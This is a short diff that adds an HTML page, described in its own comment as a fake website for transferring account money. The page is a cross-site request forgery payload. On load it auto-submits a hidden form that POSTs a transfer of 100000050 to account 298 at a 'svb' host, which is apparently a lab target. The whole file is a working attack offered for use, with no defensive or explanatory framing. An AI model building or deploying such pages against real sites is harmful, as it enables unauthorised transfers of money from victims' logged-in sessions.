@@ -1,1 +1,12 @@
 # use for creating fake website for account money transforming
+<html>
+  <head>
+    <title>Auto-submit form</title>
+  </head>
+  <body onload="document.myForm.submit()">
+    <form action="http://svb:5003/transfer/1" method="POST" name="myForm" style="display: none;">
+        <input type="text" name="account" value="298" />
+        <input type="text" name="amount" value="100000050" />
+    </form>
+  </body>
+</html>
